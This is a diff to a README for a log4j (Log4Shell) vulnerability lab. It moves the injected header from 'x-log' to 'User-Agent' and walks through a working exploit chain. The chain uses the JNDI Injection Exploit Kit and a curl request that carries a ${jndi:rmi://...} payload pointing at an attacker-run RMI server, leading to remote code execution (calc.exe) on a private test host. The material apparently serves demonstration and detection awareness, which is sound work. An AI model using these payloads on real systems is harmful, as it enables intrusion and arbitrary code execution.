@@ -78,11 +78,11 @@ the URL:
 http://<IP_ADDR>:8888/app/servlet
 ```
 
-and passing a string in the Header "x-log". (This is what gets logged.)
+and passing a string in the Header "User-Agent". (This is what gets logged.)
 For example, using curl:
 
 ```
-curl http://<IP_ADDR>:8888/app/servlet -H 'x-log: <payload>'
+curl http://<IP_ADDR>:8888/app/servlet -H 'User-Agent: <payload>'
 ```
 
 This highlights that __detecting the log4j vulnerability is not obvious at all__.
@@ -102,11 +102,11 @@ on 192.168.56.101:8888 and uses Tomcat 8.5 as a backend. Tomcat 8 (in the classp
 
 2. Launch the JNDI Injection Exploit Kit on the attacker host after building with `mvn package` with `java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C 'calc.exe'` (the payload will execute calc.exe on the target). Helper servers are started now on 192.168.56.1. Assuming the RMI url for trustURLCodeBase false config is `rmi://192.168.56.1:1099/xzmtee`.
 
-3. Trigger the exploit by sending the malicious payload through the "x-log" header: `curl http://192.168.56.101:8888/app/servlet -H 'x-log: ${jndi:rmi://192.168.56.1:1099/xzmtee}`
+3. Trigger the exploit by sending the malicious payload through the "User-Agent" header: `curl http://192.168.56.101:8888/app/servlet -H 'User-Agent: ${jndi:rmi://192.168.56.1:1099/xzmtee}`
 
-4. The app should use the vulnerable log4j for logging the contents of the "x-log" header. While logging, it looks up the referenced RMI URL, and the JNDI Kit sends the RCE payload classloading reference.
+4. The app should use the vulnerable log4j for logging the contents of the "User-Agent" header. While logging, it looks up the referenced RMI URL, and the JNDI Kit sends the RCE payload classloading reference.
 
-5. Note, that instead of logging the actual content of the "x-log" header, the referenced class name ("javax.el.ELProcessor") gets logged.
+5. Note, that instead of logging the actual content of the "User-Agent" header, the referenced class name ("javax.el.ELProcessor") gets logged.
 
 6. On the target host, calc.exe should be spawned, reaching RCE.
 
